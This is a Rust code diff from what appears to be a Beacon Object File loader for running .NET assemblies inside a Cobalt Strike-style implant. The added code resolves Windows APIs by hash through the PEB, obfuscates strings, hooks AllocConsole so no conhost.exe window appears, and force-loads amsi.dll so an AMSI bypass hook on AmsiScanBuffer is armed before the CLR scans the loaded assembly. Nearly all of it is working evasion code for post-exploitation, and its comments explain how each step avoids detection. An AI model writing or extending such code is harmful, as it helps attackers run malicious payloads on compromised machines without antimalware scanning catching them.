@@ -53,7 +53,6 @@ fn run(raw_args: *mut u8, len: usize) -> Result<(), error::BofError> {
             pe_parser::parse(&a.asm_bytes).map_err(|e| match e {
                 pe_parser::Error::MixedMode => BofError::MixedModeUnsupported,
                 pe_parser::Error::ArchMismatch => BofError::ArchMismatch,
-                pe_parser::Error::TargetFrameworkUnknown => BofError::TargetFrameworkUnknown,
                 other => BofError::PeParse(other),
             })?
         };
@@ -79,7 +78,46 @@ fn run(raw_args: *mut u8, len: usize) -> Result<(), error::BofError> {
 
         let io_ch = io::IoChannel::open(a.mailslot, &a.slot_name, &a.pipe_name)?;
 
+        // Slot 3: block AllocConsole unconditionally. The .NET Framework CLR
+        // calls AllocConsole when initialising stdio for a console-subsystem PE
+        // loaded into a non-console host (Beacon). STD_OUTPUT_HANDLE is already
+        // redirected to our pipe, so the CLR doesn't need a real console —
+        // making AllocConsole a no-op prevents conhost.exe from spawning.
+        let k32_h   = opsec_strcrypt::hash!("kernel32.dll");
+        let acfn_h  = opsec_strcrypt::hash!("AllocConsole");
+        let _alloc_console_trap = opsec_peb::resolve_module(k32_h)
+            .and_then(|m| opsec_peb::resolve_export(m, acfn_h))
+            .and_then(|target| engine.install_rip_ret(target as usize, 3).ok());
+
         let _amsi = if a.amsi {
+            // amsi.dll is not loaded in Beacon's process until the CLR loads it
+            // lazily just before its first scan. Force-load it now so
+            // install_amsi_set can resolve AmsiScanBuffer and arm the hook
+            // before the CLR gets a chance to call it.
+            if opsec_peb::resolve_module(opsec_strcrypt::hash!("amsi.dll")).is_none() {
+                let llh = opsec_strcrypt::hash!("LoadLibraryA");
+                // Try kernelbase first (Win8+), fall back to kernel32.
+                let load_fn = opsec_peb::resolve_module(
+                        opsec_strcrypt::hash!("kernelbase.dll"))
+                    .and_then(|m| opsec_peb::resolve_export(m, llh))
+                    .or_else(|| opsec_peb::resolve_module(
+                        opsec_strcrypt::hash!("kernel32.dll"))
+                    .and_then(|m| opsec_peb::resolve_export(m, llh)));
+                if let Some(ll) = load_fn {
+                    type LoadLibA =
+                        unsafe extern "system" fn(*const u8) -> *mut core::ffi::c_void;
+                    let f: LoadLibA = core::mem::transmute(ll);
+                    // obf!() does not guarantee a trailing null. Build an
+                    // explicit null-terminated stack buffer so LoadLibraryA
+                    // receives a valid C string.
+                    let raw = opsec_strcrypt::obf!("amsi.dll");
+                    let src = raw.as_bytes();
+                    let mut buf = [0u8; 16]; // zero-filled → null-terminated
+                    let n = src.len().min(buf.len() - 1);
+                    buf[..n].copy_from_slice(&src[..n]);
+                    f(buf.as_ptr());
+                }
+            }
             Some(engine.install_amsi_set().map_err(BofError::Hwbp)?)
         } else {
             None
